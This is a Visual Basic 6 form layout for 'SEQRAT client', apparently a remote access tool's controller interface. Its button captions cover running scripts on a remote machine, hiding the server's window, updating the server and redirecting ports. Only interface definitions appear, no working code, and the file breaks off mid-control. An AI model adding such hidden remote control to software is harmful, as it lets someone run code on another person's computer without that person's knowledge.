VERSION 5.00
Object = "{48DC3C96-B20F-11D1-A87F-D9394DC38340}#2.6#0"; "flatbtn2.ocx"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Begin VB.Form frmMain 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Seqrat Client"
   ClientHeight    =   7350
   ClientLeft      =   1590
   ClientTop       =   120
   ClientWidth     =   8700
   ForeColor       =   &H00F48C46&
   Icon            =   "frmSqClient.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7350
   ScaleWidth      =   8700
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   0
      Left            =   1320
      TabIndex        =   55
      Top             =   840
      Width           =   7185
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   900
         Left            =   240
         Picture         =   "frmSqClient.frx":0442
         ScaleHeight     =   870
         ScaleWidth      =   1875
         TabIndex        =   280
         Top             =   1320
         Width           =   1900
      End
      Begin VB.Label Label14 
         BackColor       =   &H00000000&
         Caption         =   "  Copyright (c) 2002 - Andrei Besleaga"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFC0C0&
         Height          =   375
         Left            =   2400
         TabIndex        =   68
         Top             =   1920
         Width           =   4695
      End
      Begin VB.Label Label13 
         BackColor       =   &H00000000&
         Caption         =   "Script Enabled Querable Remote Access Tool"
         BeginProperty Font 
            Name            =   "Terminal"
            Size            =   13.5
            Charset         =   255
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF8080&
         Height          =   375
         Left            =   360
         TabIndex        =   67
         Top             =   840
         Width           =   6495
      End
      Begin VB.Label Label12 
         BackColor       =   &H00000000&
         Caption         =   "SEQRAT client v1.0"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00A2470B&
         Height          =   615
         Left            =   1560
         TabIndex        =   66
         Top             =   120
         Width           =   4215
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   17
      Left            =   960
      TabIndex        =   249
      Top             =   720
      Visible         =   0   'False
      Width           =   7185
      Begin MSComctlLib.ListView lstScripts 
         Height          =   2145
         Left            =   0
         TabIndex        =   250
         Top             =   0
         Width           =   7095
         _ExtentX        =   12515
         _ExtentY        =   3784
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         ForeColor       =   16776960
         BackColor       =   4924675
         Appearance      =   0
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "script name"
            Object.Width           =   2822
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "author"
            Object.Width           =   1499
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "description"
            Object.Width           =   8467
         EndProperty
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   7
         Left            =   120
         TabIndex        =   251
         Top             =   2160
         Width           =   3780
         _ExtentX        =   6668
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "open"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   18
      Left            =   960
      TabIndex        =   252
      Top             =   800
      Visible         =   0   'False
      Width           =   7185
      Begin DevPowerFlatBttn.FlatBttn FlatBttn4 
         Height          =   285
         Left            =   6360
         TabIndex        =   273
         Top             =   0
         Width           =   820
         _ExtentX        =   1455
         _ExtentY        =   503
         AlignCaption    =   0
         AutoSize        =   0   'False
         PlaySounds      =   0   'False
         BackColor       =   6957824
         Caption         =   "clear"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         TextColor       =   16761024
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn FlatBttn3 
         Height          =   285
         Left            =   5520
         TabIndex        =   272
         Top             =   0
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   503
         AlignCaption    =   0
         AutoSize        =   0   'False
         PlaySounds      =   0   'False
         BackColor       =   6957824
         Caption         =   "maximize"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         TextColor       =   16761024
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   9
         Left            =   4040
         TabIndex        =   257
         Top             =   0
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "save script"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16761024
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   104
         Left            =   0
         TabIndex        =   256
         Top             =   0
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "add code to remote scriptcontrol"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16761024
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   105
         Left            =   2560
         TabIndex        =   254
         Top             =   0
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   476
         AlignCaption    =   4
         AlignPicture    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "execute"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16761024
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.TextBox txtScript 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFF00&
         Height          =   2235
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   253
         Top             =   280
         Width           =   7180
      End
      Begin VB.Shape Shape7 
         BackColor       =   &H00000000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00808080&
         FillColor       =   &H00808080&
         FillStyle       =   0  'Solid
         Height          =   375
         Left            =   0
         Top             =   0
         Width           =   7215
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   8
      Left            =   1080
      TabIndex        =   154
      Top             =   960
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox txtMatrix 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Terminal"
            Size            =   6
            Charset         =   255
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FF00&
         Height          =   2115
         Left            =   480
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   157
         Text            =   "frmSqClient.frx":14B7
         Top             =   0
         Width           =   6255
      End
      Begin VB.TextBox txtChat 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Enabled         =   0   'False
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   480
         MultiLine       =   -1  'True
         TabIndex        =   155
         Top             =   2160
         Width           =   4935
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   55
         Left            =   5520
         TabIndex        =   156
         Top             =   2160
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   4
      Left            =   960
      TabIndex        =   114
      Top             =   840
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text28 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   6000
         TabIndex        =   278
         Text            =   "5001"
         Top             =   1080
         Width           =   975
      End
      Begin VB.TextBox Text11 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   1920
         TabIndex        =   119
         Top             =   2040
         Width           =   3255
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   22
         Left            =   240
         TabIndex        =   115
         Top             =   1080
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "! close server"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   37
         Left            =   240
         TabIndex        =   116
         Top             =   600
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "restart server (only app, not the listening)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   39
         Left            =   3720
         TabIndex        =   117
         Top             =   120
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "restart sockets"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   40
         Left            =   1080
         TabIndex        =   118
         Top             =   1680
         Width           =   4815
         _ExtentX        =   8493
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "update server from below file (works only if server is compiled)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   15
         Left            =   1920
         TabIndex        =   274
         Top             =   120
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show server GUI"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   17
         Left            =   240
         TabIndex        =   275
         Top             =   120
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "hide server GUI"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   19
         Left            =   3720
         TabIndex        =   276
         Top             =   600
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "stop listening for further connections"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   20
         Left            =   3720
         TabIndex        =   277
         Top             =   1080
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "change listening port to :"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   19
      Left            =   960
      TabIndex        =   258
      Top             =   720
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text27 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Enabled         =   0   'False
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3240
         TabIndex        =   271
         Text            =   "5002"
         Top             =   1800
         Width           =   735
      End
      Begin VB.TextBox Text26 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3240
         TabIndex        =   270
         Text            =   "5001"
         Top             =   960
         Width           =   735
      End
      Begin VB.TextBox Text25 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3240
         TabIndex        =   269
         Text            =   "127.0.0.1"
         Top             =   720
         Width           =   2055
      End
      Begin VB.TextBox Text24 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3240
         TabIndex        =   268
         Text            =   "5000"
         Top             =   480
         Width           =   735
      End
      Begin VB.CheckBox Check14 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "close if open"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   3960
         TabIndex        =   263
         Top             =   480
         Width           =   1335
      End
      Begin VB.CheckBox Check13 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "connect here (to client local port)"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   262
         Top             =   1440
         Width           =   2655
      End
      Begin VB.CheckBox Check12 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "listen only; don't connect to foreign host"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   261
         Top             =   120
         Width           =   3255
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   106
         Left            =   3600
         TabIndex        =   259
         Top             =   2160
         Width           =   3495
         _ExtentX        =   6165
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "kill all redirects"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   107
         Left            =   0
         TabIndex        =   260
         Top             =   2160
         Width           =   3495
         _ExtentX        =   6165
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "enable"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label Label23 
         BackColor       =   &H00000000&
         Caption         =   "local port  :"
         Enabled         =   0   'False
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   267
         Top             =   1800
         Width           =   855
      End
      Begin VB.Label Label8 
         BackColor       =   &H00000000&
         Caption         =   "foreign host :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   2040
         TabIndex        =   266
         Top             =   720
         Width           =   975
      End
      Begin VB.Label Label8 
         BackColor       =   &H00000000&
         Caption         =   "remote port :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   2040
         TabIndex        =   265
         Top             =   480
         Width           =   975
      End
      Begin VB.Label Label22 
         BackColor       =   &H00000000&
         Caption         =   "foreign port :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2040
         TabIndex        =   264
         Top             =   960
         Width           =   1335
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   1
      Left            =   1320
      TabIndex        =   11
      Top             =   600
      Visible         =   0   'False
      Width           =   7185
      Begin VB.TextBox Text8 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3840
         TabIndex        =   61
         Text            =   "32"
         Top             =   1320
         Width           =   735
      End
      Begin VB.TextBox Text7 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   2400
         TabIndex        =   60
         Text            =   "1"
         Top             =   1320
         Width           =   255
      End
      Begin VB.CheckBox Check1 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         Caption         =   "Resolve addresses to hostnames"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1800
         TabIndex        =   58
         Top             =   720
         Width           =   3255
      End
      Begin VB.TextBox Text6 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   3240
         TabIndex        =   57
         Text            =   "127.0.0.1"
         Top             =   240
         Width           =   1815
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   13
         Left            =   1800
         TabIndex        =   64
         Top             =   1800
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   476
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "ping host"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.Label lblWait 
         BackColor       =   &H00000000&
         Caption         =   "please wait ..."
         BeginProperty Font 
            Name            =   "Terminal"
            Size            =   9
            Charset         =   255
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF80FF&
         Height          =   255
         Left            =   2520
         TabIndex        =   65
         Top             =   2160
         Visible         =   0   'False
         Width           =   1935
      End
      Begin VB.Label Label11 
         BackColor       =   &H00000000&
         Caption         =   " bytes"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   4560
         TabIndex        =   63
         Top             =   1320
         Width           =   495
      End
      Begin VB.Label Label10 
         BackColor       =   &H00000000&
         Caption         =   "Packet size :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   2880
         TabIndex        =   62
         Top             =   1320
         Width           =   975
      End
      Begin VB.Label Label9 
         BackColor       =   &H00000000&
         Caption         =   "Count :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1800
         TabIndex        =   59
         Top             =   1320
         Width           =   615
      End
      Begin VB.Label Label8 
         BackColor       =   &H00000000&
         Caption         =   "Hostname / IP :"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   0
         Left            =   1800
         TabIndex        =   56
         Top             =   240
         Width           =   1455
      End
   End
   Begin VB.Frame Frama 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   2490
      Index           =   12
      Left            =   960
      TabIndex        =   176
      Top             =   480
      Visible         =   0   'False
      Width           =   7185
      Begin VB.ComboBox Combo4 
         Appearance      =   0  'Flat
         BackColor       =   &H00800000&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFF00&
         Height          =   300
         ItemData        =   "frmSqClient.frx":1536
         Left            =   6240
         List            =   "frmSqClient.frx":1549
         Style           =   2  'Dropdown List
         TabIndex        =   203
         Top             =   1630
         Width           =   855
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   4
         Left            =   5880
         TabIndex        =   190
         Top             =   1635
         Width           =   350
         _ExtentX        =   609
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "run"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.TextBox Text19 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFF00&
         Height          =   285
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   189
         Top             =   0
         Width           =   4920
      End
      Begin VB.ComboBox Combo1 
         Appearance      =   0  'Flat
         BackColor       =   &H00670120&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFF00&
         Height          =   300
         Left            =   0
         Style           =   2  'Dropdown List
         TabIndex        =   188
         Top             =   0
         Width           =   975
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   76
         Left            =   5880
         TabIndex        =   187
         Top             =   2220
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "show image"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   75
         Left            =   5880
         TabIndex        =   186
         Top             =   1950
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "set wallpaper"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   74
         Left            =   5880
         TabIndex        =   185
         Top             =   1360
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "play wav"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   73
         Left            =   5880
         TabIndex        =   184
         Top             =   1100
